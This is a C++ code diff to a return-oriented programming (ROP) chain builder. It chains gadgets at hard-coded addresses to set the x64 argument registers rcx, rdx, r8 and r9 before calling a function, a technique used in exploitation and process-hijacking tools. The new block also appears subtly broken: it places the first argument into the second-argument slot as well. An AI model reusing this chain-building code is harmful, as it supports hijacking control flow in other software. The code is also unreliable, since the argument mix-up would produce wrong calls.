@@ -52,23 +52,11 @@ public:
                 this->AddGadget(0xb7b925, "pop r8; add rsp, 0x20; pop rbx; ret;");
                 this->AddValue(0, "set r8 to 0");
                 this->AddPadding(0x28);
-                this->AddGadget(0x24cd7b, "pop rcx; ret;");
-                this->AddValue(ConvertedArgs[3], "FourthArg");
-                this->AddGadget(0x51838a, "mov r9, rcx; cmp r8, 8; je ........; mov eax, 0x[0-9a-fA-F]+; ret;");
-            }
-
-            if (ArgCount >= 1)
-            {
-                this->AddGadget(0x24cd7b, "pop rcx; ret;"); // pop rcx; ret;
-                this->AddValue(ConvertedArgs[0], "FirstArg");
-            }
-
-            if (ArgCount >= 2)
-            {
-                this->AddGadget(0xbac765, "mov rdx, qword ptr \[rsp \+ 0x10\]; add rsp, 0x20; ret;");
-                this->AddPadding(0x10);
-                this->AddValue(ConvertedArgs[1], "SecondArg");
+                this->AddGadget(0xbac760, "mov rcx, qword ptr \[rsp \+ 8\]; mov rdx, qword ptr \[rsp \+ 0x10\]; add rsp, 0x20; ret;");
                 this->AddPadding(0x8);
+                this->AddValue(ConvertedArgs[3], "FourthArg");
+                this->AddPadding(0x10);
+                this->AddGadget(0x51838a, "mov r9, rcx; cmp r8, 8; je ........; mov eax, 0x[0-9a-fA-F]+; ret;");
             }
 
             if (ArgCount >= 3)
@@ -77,6 +65,14 @@ public:
                 this->AddValue(ConvertedArgs[2], "ThirdArg");
                 this->AddPadding(0x28);
             }
+
+            // If we have any args, we can place a value into rcx (arg1) and rdx (arg2) using a single gadget.
+            // The reason this is done instead of a 'pop rcx; ret;' and `pop rdx; ret;` is described in issue #12 on GitHub.
+            this->AddGadget(0xbac760, "mov rcx, qword ptr \[rsp \+ 8\]; mov rdx, qword ptr \[rsp \+ 0x10\]; add rsp, 0x20; ret;");
+            this->AddPadding(0x8);
+            this->AddValue(ConvertedArgs[0], "FirstArg");
+            this->AddValue(ConvertedArgs[0], "SecondArg");
+            this->AddPadding(0x8);
         }
 
         if (this->GetStackSize() % 16 != 0)
